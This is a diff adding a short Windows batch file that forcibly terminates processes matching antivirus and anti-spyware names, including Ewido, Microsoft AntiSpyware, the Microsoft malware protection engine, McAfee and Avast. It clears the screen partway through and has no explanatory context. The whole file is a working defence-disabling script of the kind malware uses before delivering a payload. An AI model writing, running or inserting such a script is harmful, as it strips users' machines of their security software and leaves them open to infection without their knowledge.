@@ -1,0 +1,12 @@
+﻿@echo off
+tskill /A ewid*
+tskill /A guard*
+tskill /A guar**
+tskill /A gcasDt*
+tskill /A gcasDt*
+tskill /A msmp*
+tskill /A msmp*
+cls
+tskill /A mcafe*
+tskill /A mghtml*
+tskill /A avas**
